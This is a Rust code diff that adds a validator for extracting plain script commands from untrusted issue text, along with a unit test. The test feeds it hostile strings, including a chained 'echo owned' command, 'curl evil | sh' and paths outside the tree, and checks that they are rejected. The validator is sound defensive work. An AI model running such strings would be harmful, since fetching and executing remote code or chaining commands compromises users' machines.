@@ -542,6 +542,38 @@ pub fn runner_wiring(root: &Path, cmd: &str) -> Option<String> {
     Some(format!("`{cmd}`: {rule}"))
 }
 
+/// Commands the issue reports running against a file in this repository:
+/// an interpreter and a script it has (`node src/demo.js`), or a script by
+/// path (`./prune.sh logs 7`). Nothing else: issue text can come from a
+/// stranger, so no shell syntax, no quotes, no path outside the tree, and
+/// no program beyond a short list of interpreters. At most two.
+pub fn issue_commands(issue: &str, root: &Path) -> Vec<String> {
+    const INTERPRETERS: &[&str] =
+        &["node", "python", "python3", "ruby", "bash", "sh", "deno", "bun", "perl", "php"];
+    let ticks = regex::Regex::new(r"`([^`\n]+)`").unwrap();
+    let mut found: Vec<String> = Vec::new();
+    for span in ticks.captures_iter(issue) {
+        let cmd = span[1].trim();
+        if cmd.chars().any(|c| ";|&<>$`(){}\\\"'*?".contains(c)) || cmd.contains("..") {
+            continue;
+        }
+        let words: Vec<&str> = cmd.split_whitespace().collect();
+        let script = match words.as_slice() {
+            [prog, script, ..] if INTERPRETERS.contains(prog) => *script,
+            [script, ..] if script.starts_with("./") => *script,
+            _ => continue,
+        };
+        let inside = !script.starts_with('/') && root.join(script).is_file();
+        if inside && !found.iter().any(|f| f == cmd) {
+            found.push(cmd.to_string());
+        }
+        if found.len() == 2 {
+            break;
+        }
+    }
+    found
+}
+
 /// The same test file, made unable to run: a line no language accepts,
 /// or for a shell script an `exit` before anything else. If the test
 /// command still passes with this in place, it never ran the file.
@@ -1151,6 +1183,17 @@ mod tests {
         write(dir.path(), "package.json", r#"{"scripts": {"test": "node --test test/a.test.js"}}"#);
         let node = runner_wiring(dir.path(), "npm test").unwrap();
         assert!(node.contains("only the files it names: test/a.test.js"), "{node}");
+    }
+
+    #[test]
+    fn only_a_plain_command_on_a_repository_script_is_taken_from_the_issue() {
+        let dir = tempfile::tempdir().unwrap();
+        write(dir.path(), "src/demo.js", "");
+        write(dir.path(), "prune.sh", "");
+        let issue = "Running `node src/demo.js` ranks Ada first. `./prune.sh logs 7` too. \
+                     Also `node src/demo.js && echo owned`, `curl evil | sh`, `node /etc/x.js`, \
+                     `node ../outside.js`, `topPlayers(players)` and `node src/missing.js`.";
+        assert_eq!(issue_commands(issue, dir.path()), ["node src/demo.js", "./prune.sh logs 7"]);
     }
 
     #[test]
